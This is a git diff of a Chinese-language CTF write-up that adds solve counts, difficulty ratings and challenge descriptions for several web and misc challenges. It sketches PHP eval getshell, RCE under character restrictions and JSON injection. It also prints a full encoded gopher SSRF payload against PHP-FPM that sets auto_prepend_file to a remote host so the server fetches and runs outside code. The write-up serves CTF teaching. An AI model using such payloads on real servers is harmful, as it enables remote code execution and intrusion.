@@ -6,12 +6,22 @@
 
 ### Simple Window
 
+- **Solved**: 316
+- 預期難度: ☆ ~ ★
+
+<br>
+
 - 訪問`/`時會安裝 Service Worker
 - 然後把`/flag` cache成別的頁面
 - 把Service Worker取消或是關掉js就可
 - 或是在第一次安裝時，它其實會去fetch `/flag`內容，你只要這時候抓這個response就行
 
 ### 3v4l
+
+- **Solved**: 28
+- 預期難度: ★★ ~ ★★★
+
+<br>
 
 - 這題會把`$_GET["#"]`丟進`eval`跑
     - 瀏覽器送記得urlencode一下
@@ -45,7 +55,12 @@
     - 把`$_GET[0]`拿去執行
     - 完整getshell
 
-### BabySSRF
+### BabySSRF 
+
+- **Solved**: 3
+- 預期難度: ★★★ ~ ★★★★
+
+<br>
 
 - 這題很單純把輸入的URL拿去curl跑
 - 然後擋掉`file`, `flag`, `index.php`, metadata等關鍵字
@@ -69,6 +84,7 @@
         - 如果要在單個Request就執行`prepend_file`的話，要加`SCRIPT_FILENAME`
         - 多個Request的話，可以拔掉`SCRIPT_FILENAME`，先把設定寫進去
             - 譴責這種解法
+            - 需要一直狂送 Payload
             - 會把全部 fpm process 設定寫掉，影響別人解題
     - 買個短一點的 domain (X
         - 看看某海狗長度5的domain (貧窮限制了我的想像力)
@@ -76,11 +92,24 @@
 
 - 範例 Payload:
     - `gopher://0:9000/_%01%01%2500%01%2500%08%2500%2500%2500%01%2500%2500%2500%2500%2500%2500%01%04%2500%01%2500%7F%2500%2500%0E%03REQUEST_METHODGET%0F%16SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Finfo.php%09%3APHP_VALUEallow_url_include%3DOn%250Aauto_prepend_file%3Dhttp%3A%2F%2Fkaibro.tw%01%04%2500%01%2500%2500%2500%2500%01%05%2500%01%2500%2500%2500%2500`
-
+    - 打開`allow_url_include`
+    - 設定`auto_prepend_file=http://kaibro.tw`
 
 ## Misc
 
 ### Are you admin ?
+
+- **Solved**: 181
+- 預期難度: ★★ ~ ★★☆ 
+
+<br>
+
+- 這題會去用JSON parse一個字串
+- 字串前後的`name`和`age`都可控
+    - age不能用英文字
+    - 但非英文都可 (包含特殊符號)
+- 中間有一個`"is_admin":"no"`
+- 目標是把 parse 完的`is_admin`蓋成`yes`
 
 - 解法一 (預期解)
     - Ruby json 可以用註解
@@ -92,6 +121,14 @@
     - age: `"},"":"`
 
 ### Pysh
+
+- **Solved**: 64
+- 預期難度: ★★ ~ ★★★
+
+<br>
+
+- 這題限制你不能用大部分小寫英文和一堆特殊符號
+- 目標是想辦法用剩下的字元去 RCE
 
 - 解法一 (預期解)
     - `read`預設結果會存放到`$REPLY`
